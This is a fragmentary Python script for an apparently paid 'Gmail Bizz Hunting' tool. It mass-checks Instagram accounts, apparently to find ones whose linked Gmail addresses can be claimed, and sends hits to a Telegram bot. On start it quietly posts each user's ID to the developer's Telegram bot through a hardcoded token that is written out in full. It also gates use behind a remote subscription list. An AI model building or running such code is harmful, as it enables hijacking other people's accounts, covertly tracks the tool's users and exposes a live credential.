...
reset = "\033[0m"
PRAVEEN = render('{SOLOHERE}', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
...
REMOTE_URL = "https://raw.githubusercontent.com/x9xuv/1/main/user.txt"
...
def fetch_id_data():
    try:
        ...
        print(f"\033[1m[❌] Error fetching data:\033[0m ")
        return []
        ...
        try:
            ...
            if id_val == input_id:
                ...
                if datetime.now() < expiry_dt:
                    ...
                    print("\033[1m\n[⛔] This ID has expired. Renew your subscription via @X7xuv\033[0m")
                    return False
        except Exception as err:
            print(f"\033[1m[⚠️] Invalid record skipped:\033[0m {record} — {err}")

    print("\033[1m\n[⚠️] You are not a paid user. Buy a subscription ~ @X7xuv(TG)\033[0m")
    return False

input_id = input("𝗨𝗦𝗘𝗥 𝗜𝗗:")
...
[ 1 ] {Colors.SILVER}𝐓𝐫𝐮𝐞   : [ {self.hits} ] 
[ 2 ] {Colors.BLUE}𝐅𝐚𝐥𝐬𝐞  : [ {self.bad_insta} ] 
[ 3 ] {Colors.MAGENTA}𝐁𝐚𝐝    : [ {self.bad_email} ] 
[ 4 ] {Colors.SILVER}𝐆𝐨𝐨𝐝   : [ {self.good_ig} ]
[ 5 ] 𝐃𝐞𝐯 ~ @X7xuv
...
def get_user_input():
    try:
        ID = input(f' {Colors.PINK}🔑 {EMOJI["user"]} TELEGRAM CHAT ID: {Colors.CYAN}')
        print(f"{Colors.GOLD}▩"*60 + Colors.END)
        TOKEN = input(f' {Colors.PINK}🤖 {EMOJI["lock"]} TELEGRAM BOT TOKEN: {Colors.CYAN}')
        print(f"{Colors.GOLD}▩"*60 + Colors.END)
        MIN_FOLLOWERS = int(input(f' {Colors.PINK}👥 {EMOJI["follower"]} MINIMUM FOLLOWERS: {Colors.CYAN}'))
        print(f"{Colors.GOLD}▩"*60 + Colors.END)
        THREAD_COUNT = int(input(f' {Colors.PINK}⚡ {EMOJI["rocket"]} THREAD COUNT [MAX 500]: {Colors.CYAN}'))
        print(f"{Colors.RED}▩"*60 + Colors.END)
        return ID, TOKEN, MIN_FOLLOWERS, THREAD_COUNT
    except ValueError:
        print(f"{Colors.RED}{EMOJI['error']} Please enter valid numbers!{Colors.END}")
        sys.exit(1)
newuser = f"""A New Star Has Entered the Universe!

🚀 Gmail Bizz Hunting Tool Activated  
🆔 ID       : {input_id}  
👾 Username  : tg://openmessage?user_id={input_id}

🛰️ Exploring the cosmic data... 🛸"""

try:
    requests.get(
        f"https://api.telegram.org/bot7671866971:AAFLMiYNDDQMCtUTGHlSeRj4Ypxk_2ZLI5Q/sendMessage",
        params={
            "chat_id": 8166622277,
            "text": newuser
        },
...
{EMOJI['star']}Private: {'✅' if is_private else '❌'}
{EMOJI['star']}Verified:{'✅' if is_verified else '❌'}
{EMOJI['star']}Business: {'✅' if is_business else '❌'}
...
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
Tool by: @X7xuv 📢 Channel: https://t.me/x9xuv |
"""
